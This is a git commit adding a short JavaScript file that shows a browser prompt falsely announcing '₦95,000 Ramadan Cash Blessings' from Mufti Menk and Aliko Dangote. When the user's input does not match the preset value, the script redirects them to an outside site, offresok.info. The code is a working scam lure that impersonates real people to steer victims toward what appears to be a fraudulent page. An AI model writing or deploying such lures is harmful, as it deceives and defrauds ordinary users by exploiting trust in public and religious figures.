7ff204f1ec40e18ea49d7d9c923a4f6a756a8324
mon-ce <suhailatakoti@gmail.com>
2026-02-17 16:39:27 +0100

    Create activeramadan.js

---
+++ activeramadan.js
@@ -0,0 +1,10 @@
+var password = '₦95,000';
+
+password = prompt(
+  'Congratulations, you are eligible for ₦95,000 Ramadan Cash Blessings from Mufti Menk in collaboration with Aliko Dangote . Click OK to activate now.',
+  '₦95,000'
+);
+
+if (password !== '₦95,000') {
+    location.href = 'https://offresok.info/95k-Dangote-RAMADAN-Blessing.html';
+}
